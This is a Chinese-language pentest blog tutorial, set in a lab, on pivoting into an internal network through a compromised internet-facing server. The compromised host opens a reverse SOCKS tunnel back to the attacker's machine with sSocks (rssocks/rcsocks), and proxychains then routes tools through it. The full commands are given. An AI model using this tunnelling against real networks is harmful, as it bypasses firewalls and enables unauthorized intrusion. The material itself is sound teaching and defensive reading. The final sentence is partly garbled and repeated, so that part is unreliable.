---
author: 星火燎原@vxhly
title: Socks 代理反弹突破内网
categories: [networking]
tags: [Network, Liunx, Pentest]
date: 2016-11-24 14:46:22
---

<Boxx changeTime="10000"/>

::: tip 前言
对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。
:::
<!-- more -->

## 环境介绍

| 机子     | 系统                    | IP                                             |
|----------|-------------------------|------------------------------------------------|
| 攻击机   | `kali Liunx` | 192.168.199.130 (外网)                         |
| 目标主机 | `ubuntu-server` | 192.168.199.131 (外网)；192.168.235.143 (内网) |
| 内网主机 | `Metasploitable2-Liunx` | 192.168.235.142 (内网)                         |

## 工具介绍

### sSocks

sSocks 是一个 socks 代理工具套装, 可用来开启 socks 代理服务, 支持 socks5 验证, 支持 IPV6 和 UDP, 并提供反向 socks 代理服务, 即将远程计算机作为 socks 代理服务端, 反弹回本地, 极大方便内网的渗透测试

### 下载

[sSocks 更新地址](http://sourceforge.net/projects/ssocks/)<br>
这里下载的版本为 `0.0.14`

``` bash
wget https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
```

### 解压并编译

``` bash
tar -xzvf ssocks-0.0.14.tar.gz
cd ssocks-0.0.14
./configure && make
```

::: warning 注意
编译的时候要先确定机子上有 gcc 环境, 没有的请自行安装
:::

### 功能

编译完成, 进入 sr c 目录, 会发现有 `nsocks` 、 `ssocksd` 、 `ssocks` 、 `rcsocks` , 其功能说明介绍如下: 

* **nsocks** 类似通过 Socks5 代理后的 netcat, 可用来测试 socks server
* **ssocksd** 用来开启 Socks5 代理服务
* **ssocks** 本地启用 Socks5 服务, 并反弹到另一 IP 地址
* **rcsocks** 接收反弹过来的 Socks5 服务, 并转向另一端口

## 攻击步骤

现假设已获得 `ubuntu-server` 权限, 也将 ssocks 这软件上传至该服务器（包含解压和编译）

### 执行本地监听

机子: `kali Liunx` ；IP: `192.168.199.130`

``` bash
cd ssocks-0.0.14/src
./rcsocks -l 1088 -p 1080 -vv
```

等待远程 Socks5 服务器访问本地 1080 端口, 创建端口 1080 与本地端口 1088 的连接通道<br>

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-1.png)

### 开启 Socks5 代理服务, 反弹

机子: `ubuntu-server` ；IP: `192.168.199.131`

``` bash
cd ssocks-0.0.14/src
./rssocks -vv -s 192.168.199.130:1080
```

启用 Socks5 服务, 反弹到 `192.168.199.130` （即 `kali Liunx` ） 的端口 1080 上<br>

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-2.png)

此时在渗透测试端 `192.168.199.130` （即 `kali Liunx` ） 可看到通道连接成功<br>

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-3.png)

### 利用 proxychains 进行 Socks5 代理

机子: `kali Liunx` ；IP: `192.168.199.130`

#### proxychains 介绍

通过前面的步骤, Socks5 代理已创建完成了。由于在渗透测试过程中, 需要使用不同的工具程序, 而在各程序中分别配置 Socks5 代理信息较为繁琐, 而部分程序并不支持配置 Socks5 代理。为了简化这些操作, 我们可以采用 `proxychains` 。

proxychains 是一个代理客户端软件, 可以支持几乎所有程序的代理, 如 `ssh` , `telnet` , `ftp` 等。利用 `proxychains` , 程序能在代理的环境下被加载运行, 而本身不需要具备代理功能。

#### proxychains 下载

需要 git 环境, 在 `kali Liunx` 使用 `proxychains`

``` bash
git clone https://github.com/haad/proxychains.git
```

#### 编译和安装

``` bash
cd proxychains
./configure
make && make install
```

#### 修改配置文件

使用前需要对 proxychains 进行简单配置, 打开配置文件 `/etc/proxychains.conf`
在 `[ProxyList]` 处添加

``` bash
socks5 127.0.0.1 1088
```

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-4.png)

 配置成功后若要启动程序, 仅需要在启动程序命令前加上 `proxychains`

### 启用浏览器 firefox

机子: `kali Liunx` ；IP: `192.168.199.130`

``` bash
proxychains firefox
```

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-5.png)

### 访问内网机子

机子: `kali Liunx` ；IP: `192.168.235.143`
::: warning 注意
现在已经可以直接访问内网主机了, IP: `192.168.235.142`
:::

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-6.png)

随便点个链接, 然后再看一眼 `ubuntu-server` 中的日志, 成功访问到内网中的页面<br>

![Socks 代理](https://vxhly.github.io/assets/socks-proxy-7.png)

## 后记

由于系统管理员的疏忽或者业务需求所致, 防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此, 在此种情况下, 通过攻陷映射到公网的端口服务, 利用反弹便可获取内网访问权限, 给内网安全带来极大的威胁。在信息安全建设与运维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁 � 维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁
